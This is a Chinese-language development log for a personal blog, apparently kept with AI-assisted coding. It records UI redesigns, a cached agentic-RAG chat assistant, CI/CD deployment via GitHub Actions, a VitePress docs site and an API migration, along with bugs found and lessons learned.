- ssh 断连会杀远端执行中的 docker exec——长任务用 setsid nohup 脱离会话，脚本设计要幂等（本例每批 commit，断点续跑零损失）。

## 十五期：AI 日报上下结构 + 时间轴折叠 + 三合一归档（2026-10-10，提交 `b2311c4`，生产镜像 `qianxi-blog:ci-16`）

用户三点反馈一次落地：

1. **AI 日报 hero 改上下结构**：十四期留下的左右双栏仍不佳——左栏文字少显空洞、右栏"实时榜"5 卡与下方精选网格同源重复。双栏整块删除，hero 瘦成一行紧凑头（实测 721px → **203px**），精选面板直接承接首屏主体。
2. **日报时间轴按月折叠**：月份行整行可点 + chevron，默认只展开最新月；去掉 8 月/12 天截断（折叠后无需）。实测 5 个月份钮、展开月 10 天可见。
3. **归档页三合一**（文章/热点/AI 日报，全前端零后端改动）：文章 tab 沿用标签文件夹+热力条；热点 tab 全量拉取按 topic_date 月份分组（实测 7 组）；AI 日报 tab 用 getAiDailyIndex 月/日索引（月份同款折叠）。热点/日报数据切 tab 懒加载。**深链闭环**：归档点某天 → `#/ai-daily?p=<encoded path>` → AiDaily 用 `?p=` 初始化 selectedPath 直达当日简报（实测通）。

踩坑备注：deploy 后旧 tab 必须 reload 才加载新 chunk（hash 导航不重载），"现在值得先看"字样残留是旧 chunk 不是回滚。

## 十四期：AI 日报首屏瘦身（2026-10-09，提交 `f93c43f`，生产镜像 `qianxi-blog:ci-15`）

用户实测反馈"一打开上面一大坨"——诊断：首屏两个叠着的巨型 hero（hero + 精选面板各自的开场三连/统计卡），内容网格被推到 ~2500px 下，且两坨数据自我重复（实时榜 top5 vs featured top3 同源、同步时间统计卡 ×2）。

砍除（功能零损失，信息全保留）：hero 左栏 3 统计卡 + 2 锚点按钮；精选面板开场三连 + 2 统计卡 + featured 大卡区；main 区开场三连。tab 从双行肥胖版改单行 chip（label+count）。

实测：内容网格 2500px → **927px**（滚半屏即达）；hero 721px；font-black 全页降档 font-bold（14 处）。单文件改动，tsc+build 双绿。

## 十三期检修批（2026-10-09，提交 `7933824`，生产镜像 `qianxi-blog:ci-14`）

上线后主动检修扫描抓出的四项：

1. **IME 组合期保护（高危）**：看板娘两处新 textarea 无 `isComposing` 检查——中文输入法按 Enter 选候选词会把半打的字直接发出去。AgentChat 早有同款，十三期新输入框漏抄；两处补齐。生产 bundle 实测 `DesktopPet-*.js` 内已含 isComposing。
2. **ConfirmDialog 焦点策略**：danger 场景焦点从确认钮移到取消钮——弹窗后误按 Enter 不再直接执行删除类操作。
3. **window.confirm 清零**：十三期只替换了两个 sub 的认领文件，全站扫描发现 5 文件 11 处残留（DesktopPet 1、UserAdminPanels 4、UserDetailDrawer 3、UserCenter 2、ArticleEditor 1）全部换 useConfirm；不可逆操作 danger:true。实测：UserCenter"我的文章"删除钮只在非 published 态渲染（设计如此非 bug）。
4. **回复框切换清残留**（ArticleDetail 两处）：A 框半截字不再跟到 B 框错发给上一人。

契约核实：`likeComment` 后端两分支均返回 `{liked, like_count}`，十三期点赞校准读值安全。
部署后旧 tab 报 "Failed to fetch dynamically imported module" 属 chunk 哈希替换的正常现象——硬刷新即可，勿当 bug 排查。

## 十三期：头脑风暴六路落地——4 个生产事故 + 全站质感批次（2026-10-09，提交 `3f68d0c`，生产镜像 `qianxi-blog:ci-13`）

第二轮头脑风暴（五顾问 + 魔鬼代言人，全部实读源码）拍板全做：26 文件 +1211/-843 一批交付。魔鬼预算线全程遵守：零新依赖、短语义类、改动可逐行验收。

### 生产事故修复（顾问挖出的比美化更值钱）

| 事故 | 根因 | 修复 |
|---|---|---|
| **A1 代码块全站乱码（P0）** | `String(children)` 把 rehype-highlight 的 span 数组压成 `[object Object]`，文章页+看板娘回答代码块零高亮+复制乱码（生产带着跑了） | 渲染改 `{children}` 保 span，复制用同文件已导出的 flattenMarkdownText；复制按钮加"已复制"反馈 |
| **A2 移动端后台不可导航（P0）** | 侧栏 `-translate-x-full` 被挪走但全文件无汉堡钮/遮罩 | 汉堡+遮罩+路由自动收起；CDP 窄视口全链实测过 |
| **A3 primary 色阶静默失效（P1）** | config 只定义 5 档、全站引用 9 档 132 处——CDN JIT 对未定义档不生成 CSS，暗色一半配色从没上过线 | 补 sky 色阶 6 档零漂移；浏览器实测 400/900 规则已生成 |
| **A4 TOC 死链（P1，两个根因）** | ① 手搓 id 算法与渲染侧不一致（95 篇 5/9 死链）② 提取正则不排除代码块，`# 注释` 误进目录（106 篇 12/32 死链） | ① 改 import 渲染侧同一函数 ② fenced 剥离后再匹配 |

外加：3 个死动画类清零（pulse-slow 补定义、animate-in 插件语法替换、幽灵 fade-in）；DesktopPet 存量文案 U+FFFD 乱码字符修复。

### 质感与效率批次（生产实测全绿）

- **评论区五合一**：嵌套回复补回复按钮（原来想回二级回复只能错挂到顶级）+ 回复框共用提取 + 登录用户假昵称表单隐藏；作者回应渐变信封；点赞乐观更新（瞬变+校准+回滚，Heart 替换 emoji + like-pop）；正文 17px/1.85 中文舒适区；移动端目录抽屉（胶囊+底部 sheet）
- **全站**：夜空氛围层铺 PublicLayout（fixed 长页可见）；路由 180ms 淡入 + ScrollToTop（instant 覆盖 smooth）；主题切换 320ms 柔和过渡（临时 class）；Toast 出场动画；reduced-motion 总闸；og 分享元数据；Home 卡片化+picsum 换本地渐变；ArticleList 话术从"运营工作台"改回读者书架
- **后台**：评论审核从装饰卡降密度为审核行（**42 行同屏** vs 原 2-3 卡；"当前：N 条"计数修复恒显 0 的存量 bug）；ConfirmDialog 统一 17 处原生 confirm（danger 红钮+深色卡实测）；表格 TH/TD 令牌+斑马纹；Settings 整页 dark 补全；Dashboard trendUp 从死 prop 变待办仪表（amber/emerald 实测）+ 侧栏待审红点
- **社区/AI 触点**：过程流折叠态（流结束收一行摘要）；看板娘输入区两处 textarea 化（Enter 发送/Shift+Enter 换行/发送后高度重置）；问千禧"等待千禧回复/千禧已回答"双态徽章+"投递给千禧"文案（实测显示等待态）

### 执行机制与踩坑

- **六路 subagent 分工**（文件清单零重叠）+ 主线手术我亲手。**两路输出崩坏**：subD 整簇未落盘（由主会话接手补完六个文件）；subB 半成品（6 处小写 th 笔误 + 声称 tsc 全绿是假话）——教训：**subagent 收尾消息不可信，落盘状态以 git diff + tsc 为准**；乱码扫描要进收尾流程（本轮 U+FFFD 1 处写入存量文案属存量但被扫描抓出）。
- **boot page 时序坑**：CI 部署的原子替换会清掉部署前创建的 boot page → 必须部署完成后再生成。
- 真实测试覆盖 14 项（hljs span 100 个、42 行审核列表、CDP 窄视口全链、ConfirmDialog 深色 danger、theme-switching 类生命周期、og/氛围层/卡片/徽章），全部生产浏览器实测。

## 十二期：review 驱动完善（2026-10-09，提交 `11fb0f2`，生产镜像 `qianxi-blog:ci-11`）

十一期上线后的全量 review 轮：用户点名「review 博客更改 + AgentChat 三段式排版不美观 + 重点检查 Agentic-RAG 是否完善 + 同步 Pages 文档站」。

### Review 结论与修补（Agentic-RAG 完善）

链路本身验证正确（回放写历史/独立事务/冲突兜底/信号量），但揪出三个真缺陷当场修掉：

| 问题 | 修补 |
|---|---|
| **缓存无 TTL**——文章更新后旧答案永久回放 | 7 天 TTL：查询带 `created_at > cutoff`，过期走 LLM 重答；覆盖分支**同步刷 created_at 重置 TTL**（review 推演出：不刷的话过期行每次重答覆盖后依然过期，永远命不中缓存——连锁缺陷） |
| **缓存无管理通道**——差答案永久缓存只能手敲 sqlite | `GET /chat/qa-cache`（列表+过期标记）、`DELETE /chat/qa-cache`（默认清过期、false 全清）、`DELETE /chat/qa-cache/{id}`（单删），全部管理员鉴权；管理面走 AI 助手 call_api 兜底，零前端 UI |
| **来源判断只认完整 URL**——模型裸路径 `#/articles/5` 引用被证据门误报 | `_has_citation()` 认 URL 也认 `/articles/` 裸路径 |

顺带：`ChatResponse` 随非流式端点下线已成孤儿 schema，删除。review 中**否决**的两个候选：归一化覆盖中间标点（精确匹配的保守边界是设计意图，不做）；气泡抢占 6/分限流（气泡失败自动退静态文案，伤不到用户）。

### AgentChat 排版重做（用户点名）

原三段式的问题不是结构是质感：**助手消息白底页贴白底文字零层次**。重做：消息区改淡灰底让助手白卡浮起（工具卡/思考折叠区卡内递进）、顶栏与输入区毛玻璃化+渐变标题（AdminLayout 同语言）、根容器加两团极淡径向渐变氛围层、空状态引导卡加菱形引导符+悬浮上移、头像加白环。浏览器逐指标实测全中（毛玻璃/渐变徽章/白卡/用户泡/头像环）。

### 文档站（Pages）同步十/十一期

ai-architecture.md：9 工具表补评论语料说明、端点收敛单通道（旧端点标注已下线 404）、新增 QA 缓存/证据门/内容闭环三节、事件协议补 evidence_warning 与 cached；features.md 与 history.md 同步。**全站 3 个 mermaid 块真浏览器渲染验证 3/3**（改图必验的既定流程）。docs/** 推送触发 Pages workflow 与 CI/CD 双绿，线上抽查三处内容均生效。

### 追补：会话栏可收起（`795b467`）

用户澄清首版重排版没接住真实痛点——不是视觉层次是**空间分配**：后台里 AdminLayout 导航（256px）与会话栏（256px）两栏相叠，聊天区被挤成中间一条。会话栏改为可收起：展开 256px ↔ 收起 56px 窄条（渐变展开钮 + 快捷新建），默认收起（聊天区优先），偏好记 localStorage。实测：聊天区 617px → 873px。

### 本期踩坑

- `TARGET_UID=1` 硬编码差点误诊：boot page 注入 token 进不了后台，真因是**路由路径写错**（`#/admin/agent` 应为 `#/admin/ai-agent`，被通配路由弹回首页）——浏览器路由守卫的「弹回」行为是路径错误的第一嫌疑。
- pwsh 内联 here-string 嵌 python 的引号地狱再犯一次（解析器把 python 的 `from` 当 pwsh 关键字）——远程多语言嵌套永远走 .sh 脚本，已是无争议的老规矩。

## 十一期：agentic-rag 收敛 + 前端构建移出服务器 + 基建修复（2026-10-09，提交 `93c5fa7`，生产镜像 `qianxi-blog:ci-9`）

按架构图做资源受限的 agentic-rag 化（千禧拍板：不搞向量召回；前端构建不在生产服务器上做，能在 GitHub 弄的都在 GitHub 弄）。

### 一、问答端收敛（单一通道）

| 端点 | 处置 |
|---|---|
| `POST /chat/message`（非流式，旧 PoroRagAgent） | **下线**（404） |
| `POST /chat/message/stream`（伪流式切片吐） | **下线**（404） |
| `POST /chat/message/agentic`（真 SSE） | **唯一通道**；气泡主动搭话也切到它（只收 text 事件） |

配套：`poro_rag_agent.py`（500+ 行旧手写工具循环）退役归档 `.retired`；`Live2DWaifu.tsx` 是零引用死代码且阻塞旧 API 删函数（tsc 会炸），一并删除；`api/chat.ts` 删 `sendMessage`/`sendMessageStream`。

### 二、缓存层 + 证据门（架构图的资源受限映射）

- **QA 一级缓存** `chat_qa_cache`：归一化（小写/压空白/去尾标点）→ sha256 **精确命中**才回放（近似命中要相似度=要向量，明确不做）。写入双条件（用过检索工具 且 回答含 URL）排掉闲聊与兜底话术；回放照常写会话消息保持历史完整；缓存写入**独立事务**（教训：同事务 add 唯键冲突对象再 rollback 会连坐滚掉 assistant 消息）。实测：**同题 50s → 0s**，`cached:true`，hit_count 递增。
- **证据评估门**：tool 用过但回答零 URL → SSE `evidence_warning` 软警示（零额外 LLM 的"诚实信号"），前端气泡下方黄底提示。

### 三、前端部署链路改造（红线：服务器零构建）

此前 deploy_frontend.sh 在生产服务器 npm ci + build（1G 内存宿主机被构建挤压会伤线上服务）。改为：**runner 构建**（frontend-checks → upload-artifact）→ deploy job download-artifact → 打包 → **scp 上传** → 服务器只做解包+结构校验（index.html / 主 chunk 存在 / 文件数≥50，挡半包坏包）+ 原子替换 + 保留 uploads/data + 公网验证 + 失败回滚。部署日志复核：**服务器全程无 npm 痕迹**。

### 四、基建修复：生产建不出新表的缝隙（本轮最重要的发现）

`chat_qa_cache` 启动后 `no such table`——**删表重启的对照实验复现**后定位根因链：
1. `create_all` 挂在 `if settings.DEBUG:` 下，生产 DEBUG=false **从不执行**；
2. 项目从不用 Alembic（表结构演进一直靠 `ensure_schema_columns` 补列）；
3. 于是"新增模型"在生产永远不生效——十一期前没暴露是因为**此前从没加过新表**（只加过列）。

修法：幂等 create_all（checkfirst）挂进 lifespan 无条件执行的 `ensure_schema_columns` 开头。**决定性实验验证**：删表 → 重启 → 表自动建出（7 列完整）。今后新模型上线即自动建表。

### 五、前端美化（Login / Register / AdminLayout）

Login/Register：径向渐变夜空背景（3 层）+ 毛玻璃卡片（blur 24px，实测）+ 🐾/🚀 logo 徽章 + 36px 渐变标题 + 输入焦点青色发光；Register 进度条改编号节点点亮式。AdminLayout：品牌区双行（DevLog / ADMIN CONSOLE）+ hover 轻旋，侧边栏激活态左侧 3px 渐变辉光指示条（浏览器实测全中）。

### 本期踩坑与教训

- **本地删除的文件不会随 stage 流上传**——poro_rag_agent.py/Live2DWaifu.tsx 只在本地删了，服务器仓库还在，`git add -A` 在服务器端看不到删除 → **0073f90 的 CI 如预期炸在 tsc**（Live2DWaifu 引用已删函数）。CI 拦截是设计内（失败不碰生产），但补丁提交（fb54808）本可避免：**stage 流程不传"删除"是它的固有盲区，删文件要么走服务器端 git rm，要么在本地 commit 后用别的同步方式**。
- **ChatQaCache 先在函数内 import** → 模块加载时不在 Base.metadata → create_all 跳过。函数内 import 只在"调用时才注册模型"，新模型必须顶部 import——这类"注册型副作用"不适用按需加载。
- 两处 CLI 验证脚本里 `grep -c` 返回 0 + `set -e` 会把"计数脚本"误杀——计数场景要 `\|\| true`。

## 十期：头脑风暴落地（2026-10-08，提交 `a892737`，生产镜像 `qianxi-blog:ci-5`）

六路头脑风暴（五角度创意 + 魔鬼代言人）的落地轮。拍板：AIHOT 日报邮件推送不做，其余六项全做。**首次由 CI/CD 全自动部署的业务改动**（ci-5：backend+frontend 双部署，检查全绿后 Actions 自行完成，无需人工跑任何脚本）。

| 项 | 实现 | 关键设计 |
|---|---|---|
| A2 评论进看板娘语料 | `rag_retriever.search_comments` 挂进 `search_blog_articles` 工具 | **只喂 approved（审核通过即背书）**；target_type/target_id 主路径关联；评论权重 3 分/词（低于正文），`is_admin_reply` 加权 6 倍；实时检索零迁移。system prompt 教模型引用"评论区里 {nickname} 补充过" |
| A3 投稿叙事 | WritePage 顶部「粘入笔记三步成稿」卡 + Login 卖点句 | 纯文案，能力全是现成的（渲染/摘要/审核/署名主页） |
| B1 论坛收缩「问千禧」 | 6 版块 → 单版提问箱（id=4 改名，其余 is_active=0，**一条 UPDATE 可逆**）+ ForumHome 定位重写 | "不是论坛，是直达千禧本人的提问箱"；3 个存量帖全是测试帖零牵挂 |
| B1 问倒了转人工 | DesktopPet 最后一条助手回复挂轻量入口 → 组装对话上下文 → `createForumThread` | **零后端改动**：复用游客发帖 API（蜜罐/限流全生效）；版块 id 动态取第一个活跃版块。论坛第一批内容由真实提问自己流进来 |
| B3 可追问导读卡 | articles 补 `ai_intro`/`ai_intro_adopted` 两列（幂等补列）+ `POST /articles/{id}/generate-intro` + `generate_article_intro` 技能 | **红线：生成即撤销采纳，必须过目**；`ArticleResponse` 的 model_validator 保证未采纳草稿不从任何 API 泄出；采纳走 `ArticleUpdate.ai_intro_adopted`，管理员全流程在 AI 助手对话里完成零管理端 UI；文章页点问题经 `CustomEvent('poro-ask')` 唤起看板娘，问题带《文章标题》前缀让她优先命中本文（不做重的上下文锁） |
| B2 问答成文 | **零新代码**：system prompt 写明工作流（读帖→整理署名→create draft→提醒过目） | 现有技能（forum 读 + article create）已能闭环——懒惰阶梯第 2 级 |
| 提问历史 | `GET /chat/sessions`（登录专属，游客 401）+ DesktopPet Clock 图标下拉恢复 | 看板娘记忆冲突的折中：只回放不改变行为，无向量无长期记忆无共享状态——隐私与只读不变量都不破 |

selfcheck 26 用例补 PATH_CASE（generate-intro 路径）与白名单（ai_intro_adopted）。

### 验证（生产实测全绿）

- CI/CD 首次全自动业务部署：检查（26 用例 + tsc + build）→ ci-5 后端（技能 55 个可构建、health、公网 200）→ 前端服务器构建原子替换
- A2 容器内真实检索：宽词命中 3 条真实评论（BEiT-3 文章下"AI研究者小李"等）、乱词 0
- B3 端到端：LLM 真调用生成（Sarsa 文章的三个追问问题质量在线）→ **未采纳时 GET 文章 ai_intro=None（泄出防线验证过）** → 采纳后文章页渲染导读卡 → 浏览器点击引导问题 → 看板娘面板自动打开、问题带标题前缀自动发送、过程条真实滚动（3 轮检索 + 读全文）
- B1：公网 `GET /forum/categories` 只剩 (4, 问千禧)；论坛页「问千禧」+ 提问箱叙事 + 提问按钮渲染
- 追问历史：未登录 401；面板历史按钮在位
- 数据：articles 23 / comments 42 / integrity ok / ai_intro 列幂等补齐

### 本期踩坑（两处同类失误，值得记一次）

**edit 工具的 old_string 尾部带了"下一块的开头"而 new_string 没还原，连续两次删掉相邻函数体**（`fix_read_time` 的 docstring+查询、`patchAi` 的函数头）。两次都被 git diff/tsc 立刻抓住，但根因一样：**做多块插入时 old_string 只锚装饰器/签名行，不要把后续代码卷进来**。另外 `--cmd` 传 SQL 又被 pwsh 引号搅了一次（老坑），照规矩换 .sh 文件解决。

## 九期：AIHOT 旧接口迁移到 v1（2026-10-08，提交 `98b68d1`）

AIHOT 官方把 `/api/public/*` 与旧域名 `aihot.virxact.com` 的停用日期**提前到 2026-10-31**（原定 12-31）。本仓库唯一调用方是 `scripts/fetch_ai_daily.py`（cron 每 30 分钟生成前端 AI 日报静态数据）；后端热点服务用 OpenAI/Anthropic RSS，与 aihot 无关——**先全仓库 grep 确认调用面，再动手**。

**改写要点**（前端零改动：输出 JSON 保持 `aiDaily.ts` interface 的扁平契约，v1 的嵌套结构在 adapt_* 里降级）：

| 项 | 旧 | 新 |
|---|---|---|
| 日报 | `/api/public/daily`（顶层即日报体） | `/api/v1/dailies/latest`（**顶层 `report` 里**） |
| 精选 | `/api/public/items?take=N` | `/api/v1/items?limit=N`（上限 100；window 不传=默认 7d） |
| 字段 | `title_en` / `url` / `source` / 顶层 `hasNext/nextCursor` | `originalTitle` / `links.original` / `source.name` / `page.*` |
| 日报条目 | 扁平 `sourceName/sourceUrl/permalink` | 嵌套 `{source:{name}, links:{aihot,original}}` → 适配层降回扁平 |
| attribution | `{source, canonical}` | `{name, url}` → 适配回旧格式 |
| 请求 | 无压缩、伪装浏览器 UA | gzip + If-None-Match（304 跳过日报重写）+ 诚实 UA `aihot-api/2.0.0 …` |

**迁移红线**（官方明确）：v1 只接受 OpenAPI 声明且不重复的参数，`_` 防缓存/未知参数直接 400——除 mode/limit/category 外什么都不加；**不传 window 用默认 7d**（与旧全量精选语义最近）；ETag 全新开始，不复用旧值。

### 踩的坑：ETag 头大小写

首跑后 ETag 状态文件**一直没写出来**、304 从未发生。根因：nginx 实发头名是 **`Etag`**，而 `dict(resp.headers)` 转成 dict 后按 `'ETag'` 取值拿不到（.NET 调试时显示的 "ETag" 是规范化假象）。**修法：不转 dict，直接用 `HTTPMessage`（大小写不敏感容器）**。

### 验证

- 本地真实拉取（今日日报 5 sections/12 条、精选 96 条）→ 逐字段对照前端契约**全部通过**、全 JSON 零旧域名
- 二跑命中 304、日报文件 mtime 不动、精选照常更新
- 生产同步后同样全绿：产物扁平契约正确、旧域名 0、公网新 JSON 生效；浏览器实测 AI 日报页渲染今日新数据（"OpenAI Decisions API 公测上线"），页面内旧域名链接 0

### 遗留（待确认，见对话）

- 历史归档 JSON（仓库与 dist 的 `ai-daily/*.json`）里 permalink/canonical 仍是旧域名——10-31 起旧域名只做跳转，链接仍可达；要不要批量替换待拍板
- `aiDaily.ts` 的 `refreshAiDaily()` 调不存在的后端路由且零调用（死代码），只报告不动

## 八期：GitHub Actions CI/CD（2026-10-08，提交 `2283c0b`，生产镜像 `qianxi-blog:ci-3`）

部署方式从"手工脚本"切换为 CI/CD：push master（触及 `backend/` 或 `frontend/`）→ 自动检查 → 通过后 SSH 自动部署生产，失败自动回滚。**此前的部署笔记（一~七期的 b_*.sh 流程）从此退役为应急手段**。

链路（`.github/workflows/ci-cd.yml`）：

| job | 内容 |
|---|---|
| backend-checks | pip install + 跑 `backend/scripts/selfcheck_skills.py` 26 用例（首次 CI 实测 0.057s OK） |
| frontend-checks | npm ci + `tsc --noEmit` + vite build |
| deploy | 内联 git diff 判定部署面 → appleboy/ssh-action 调服务器脚本；**concurrency: production-deploy 不并发**；**docs/** 与纯 *.md 不触发** |

服务器端脚本 `scripts/ci/deploy_backend.sh` / `deploy_frontend.sh`（随仓库走，服务器 reset 后用仓库里的版本）：

- 后端：git archive 构建镜像（tag=`ci-<run_number>`）→ **镜像内自检（import + 技能构建>50，切生产前挡住坏镜像）** → 从现容器 `docker inspect` 抓 env 注入新容器（**生产密钥只活在容器 env，永不落仓库/日志**）→ 切容器 → health 90s，失败切回 prev → 公网双 200。prev 容器/ci 镜像各留 2 份自动清理。
- 前端：**服务器本地 npm ci + build（代码即产物）**——彻底消灭"上传没生效/md5 对不上"那类坑（踩过两次）→ 原子替换 dist，保留 uploads/data/.well-known/live2d → 新 chunk 落盘+公网双验证，失败恢复旧目录。
- 手动入口：Actions → Run workflow → 勾 deploy_backend / deploy_frontend（backend/frontend 均无变化时可强制重跑部署）。

Secrets：`DEPLOY_HOST` / `DEPLOY_USER` / `DEPLOY_SSH_KEY`（专用 ed25519，服务器 authorized_keys 里带 `github-actions-deploy` 注释，可随时 `sed -i '/github-actions-deploy/d'` 撤销）。**workflow 与脚本是公开文件，不含服务器 IP 与任何密钥。**

### 首次部署踩的坑（花了三小时才定位，务必记住）

**`gh secret set` 用 pwsh 管道喂私钥会坏**：`Get-Content key -Raw | gh secret set ...` 时 pwsh 给原生进程的管道把行尾规范化成 CRLF，GitHub 端存下的私钥每行带 `\r`，Appleboy 的 Go `ssh.ParsePrivateKey` 解析失败的报错是 **`this private key is passphrase protected`**——完全误导（key 根本没口令，本地 `ssh -i` 直连都通）。**修法：字节保真写 secret：`cmd /c "gh secret set NAME < key文件"`**（cmd 的 `<` 是真字节流重定向）。顺带两个 pwsh 事实：pwsh **没有** `<` 重定向语法（那是 cmd/bash 的）；`ssh-keygen -N ''`（pwsh 单引号空串）生成无口令 key，验证方法是 `ssh-keygen -y -f key -P ''` 能读出公钥。

### 验证（全绿）

- dispatch 全链路：后端 ci-3 构建成功 → 镜像内技能 54 个可构建 → 切容器 → health 6s 过 → 公网 api/home=200；前端服务器本地构建 → 保留 uploads(53)/data(22) → 原子替换 → chunk home/chunk=200
- 独立复核：数据基线不变（articles 23 / comments 42 / users 2）、integrity ok、**生产镜像内 26 用例 OK**、公网 8 项 200/401 符合预期、dist 属主 www-data
- 触发面验证：纯 scripts/ci 推送 → 检查跑、部署正确跳过；`.md`/docs 推送 → 不触发

### 如实记录的观察（非本次改动引入）

- `agent_sessions` 由 2 变 1：CD 链路无任何 SQL 写、数据库为挂载卷未重建（其余表全部与基线一致），应是用户侧自行删除；留意即可。
- dist/data 由 14 变 22 个文件：线上内容自然演变，脚本只搬运不删。

## 七期：项目文档站（VitePress → GitHub Pages，2026-09-30，提交 `196626f`）

**<https://qianxi-00.github.io/My_Blog/>** —— VitePress 1.6.4 + GitHub Actions + Pages，纯静态、免费托管，推送 `master` 后自动构建发布。

结构：`docs/` 下 `index.md`（home 布局：Hero + 6 张 Features 卡片）、`intro.md`、`features.md`、`deploy.md`、`.vitepress/config.ts`、独立 `package.json`（**不影响** `frontend/` 的构建）。**跳转博客是本站的点睛**：Hero「🚀 进入博客」按钮、导航栏「进入博客」、侧栏「线上站点」组、Features 卡片全部直链 `blog.qianxi7988.me`（含 `#/articles`、`#/hotspots`、`#/subscribe` 内页）。

写作流程：本地 `docs/` 改 md → `npm run docs:build` 验证 → 推送 master（`paths: docs/**` 才触发 Actions）→ 1 分钟后线上生效。新页面在 `docs/` 加 md 并登记进 `config.ts` 的 sidebar。内容红线：**公开仓库**，不写服务器 IP / 密钥路径 / 运维细节，敏感细节指向仓库内 DEPLOY.md 而非展开。

三个搭建踩坑（复现成本都很高，记录免重踩）：

1. **`vitepress@1.6.4` 是 ESM-only**（`"type":"module"`，exports 无 require 条件）。`docs/package.json` 忘写 `"type": "module"` 时，Vite 把 `config.ts` 按 CJS 打包、用 `require()` 加载外部化的 vitepress，直接炸 `ESM file cannot be loaded by require`——报错全程不提 package.json，极易误诊为 esbuild 问题（本机 npm 的 install-scripts 还拦截了 esbuild postinstall，先骗我排查了十分钟二进制）。**修法：加 `"type": "module"`。**
2. **VitePress 死链检查把 `/intro/`（尾斜杠）当字面目录**，4 个链接全部报 dead link 且 build 失败。站内链接写 `/intro`（不带斜杠）。
3. Pages 端点必须 `build_type=workflow`（`gh api -X POST repos/qianxi-00/My_Blog/pages -f build_type=workflow`），否则默认等 gh-pages 分支，Actions 的 deploy-pages 步骤会 403。

验证（全绿）：Actions run `success`；`/`、`/intro.html`、`/features.html`、`/deploy.html` 全 200；CSS GET 200（线上 `app.DxTFQC_Q.js` 哈希与本地 dist 完全一致 = 线上跑的就是推的这份）；浏览器实测 Hero 三按钮（「🚀 进入博客」href=`https://blog.qianxi7988.me/`）、6 张卡片、导航/侧栏跳转、品牌按钮样式（rgb(86,114,205) 圆角 20px）真实生效。

### 七期之二：文档站页面扩充（2026-10-08，提交 `1d96f14`）

- **`ai-architecture.md`**：AI 问答架构拆解——双智能体定位对比表、无向量 A-RAG 的检索管线与九工具、54 技能薄封装架构、批量操作的技能层设计、26 用例契约自检的六组检查表、返回裁剪（78K→21K 实例）、伪流式/SSE 事件表、安全模型矩阵。配 3 张 mermaid 流程图（**引入 `vitepress-plugin-mermaid` + `mermaid` 两个 devDependency，`withMermaid(defineConfig(...))` 包一层**，客户端渲染，浏览器实测 3 张 SVG 节点 37/38/34 真出图）
- **`history.md`**：事故驱动的开发历程（XSS 根因与红线、助手三连修、静默 bug 引出契约测试、DetachedInstanceError 自省、技能扩充两决策、手工→CI/CD 演进），收尾三条贯穿纪律
- `intro.md` 补「规模速览」（145+ 端点 / 54 技能 / 9 工具 / 26 用例，全实测）与「设计原则」；`index.md` features 加两张卡（AI 架构 / 开发历程）；nav 与 sidebar 登记新页
- 内容红线不变：公开页不写 IP/密钥/服务器路径，讲设计不讲运维细节

> **尾斜杠坑复发**：从旧文件抄来的 `/features/` 写法又被 VitePress 死链检查拦下 3 处。上次的修正则 `\((/[a-z]+)/\)` 只匹配纯小写段，漏了带连字符的 `/ai-architecture/`——已升级为 `\((/[a-z][a-z-]*)/\)` 并全站扫过。**抄旧文件里的链接写法前，先想想它是不是当年那个错法。**

## 六期：两个 AI 的技能扩充（2026-09-30，镜像 `qianxi-blog:users11`）

后台 AI 工具 **24 → 54**，看板娘工具 **5 → 9**。提交 `f0f8cd9` / `4e03fdb` / `fd52cae`。

### 一、先修 bug：articles 技能的三个静默错误

加技能前盘点 API 时发现的，**比新技能更要紧**——它们不报错，只是结果不对：

| 技能 | 原来传 | 后端实际 | 后果 |
|---|---|---|---|
| `search_articles` | `keyword=` | `GET /articles` 的参数叫 `search` | FastAPI 静默忽略未知 query，**"带关键词搜索"和"不带"返回全量**，AI 一直以为自己在搜索 |
| `manage_article(create)` | `content=` | `ArticleCreate` 必填 `content_md` | 建文必 422 |
| `manage_article(update)` | `content=` | 同上 | Pydantic 吞掉未知字段，**改正文"以为改了其实没改"** |
| body 白名单 | 只有 5 个字段 | 后端还支持 `summary`/`cover_image`/`is_pinned`/`scheduled_at`/`slug` | 即使后端支持也调不到 |

**验证**：修复后 `keyword=RAG` → total=1、`keyword=不存在关键词zzz999` → total=0；修复前这两种都会返回全量 23 篇。

> **教训**：skill 是对 HTTP 路由的薄封装，**参数名必须对着路由签名抄**。这类错误不抛异常，只会让 AI 拿到错误结果再据此编造答案，比崩溃难发现得多。加/改 skill 后务必「逐个真实 dispatch 一次」。

### 二、新增技能

| 模块 | 数量 | 覆盖 |
|---|---|---|
| `hotspots`（新） | 8 | 日报列表/元信息/精选/详情/来源/增删改发布隐藏/手动触发抓取/任务历史 —— **此前 14 条路由一个 skill 都没接**，AI 完全不知道站点的 AI 日报存在 |
| `forum`（新） | 6 | 版块/主题/回帖查看 + 置顶/锁帖/改名/删除。**刻意不暴露"建主题/发回帖"**——那是访客自助（带昵称邮箱和蜜罐反机器人），AI 不该替访客发帖 |
| `batch`（新） | 4 | 批量审评论/处理举报/改文章/审提示词。全站**没有任何接受 `ids` 列表的路由**，AI 想"一次过 20 条"只能循环单条；这里做循环+汇总，单条失败不中断整批，`failed` 列表如实回报 |
| `users`（新） | 4 | 统计/搜索/详情/封禁/解封/重置密码/改角色/换邮箱/删除 —— 用户系统二三期做了一整套后台管理，但 `skills/admins.py` 只覆盖管理员账号，注册用户这块 AI 只能靠 `call_api` 盲猜 `/admins/users/*` |
| `articles`（增补） | +5 | 待审投稿、投稿审核（驳回强制给原因）、AI 生成摘要、重算阅读时长、置顶/下架 |
| `subscribers`（增补） | +2 | 轻量总数统计；查找长期不活跃订阅者（后端无分页筛选，只能拉全量本地过滤；**技能只负责"看清楚"，不做任何清理动作**） |

### 三、看板娘 A-RAG：5 → 9

她此前只有检索类工具，访客问「你们都写什么」「最近更新了什么」「最火的是哪篇」都没法答——只能靠关键词硬搜。新增 4 个**导航类**工具：`list_blog_topics`（分类/标签及文章数）、`list_latest_articles`、`list_popular_articles`、`get_site_facts`。这些只给标题与链接，访客要读正文时再走 `search` + `read_blog_article`。system prompt 补了「导航类问题用专门工具」的分流规则，并明确她是只读的。

### 四、两个容易漏的连带修改

1. **`SYSTEM_PROMPT_AGENT` 原先把 Tool 清单写死成「call_api / execute_sql」两个**——新增工具后模型不会知道它们存在。改成按业务域列出全部技能，并补上「批量优先用 `batch_*`」「字段名照抄 schema（`content_md` / `topic_date` / `analysis_md`）」。
2. **前端 `SKILL_LABELS`** 补全 54 个技能的中文名，新技能在界面不再显示英文标识符。

### 五、工具返回体积要收着点（实测踩到）

